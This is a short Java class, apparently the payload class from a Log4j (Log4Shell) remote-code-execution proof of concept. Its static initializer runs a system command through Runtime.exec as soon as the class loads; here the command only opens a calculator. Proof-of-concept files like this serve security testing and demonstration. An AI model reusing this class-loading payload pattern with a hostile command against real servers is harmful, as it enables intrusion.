package com.example;

public class Log4jRCETest {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc.exe"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {

    }
}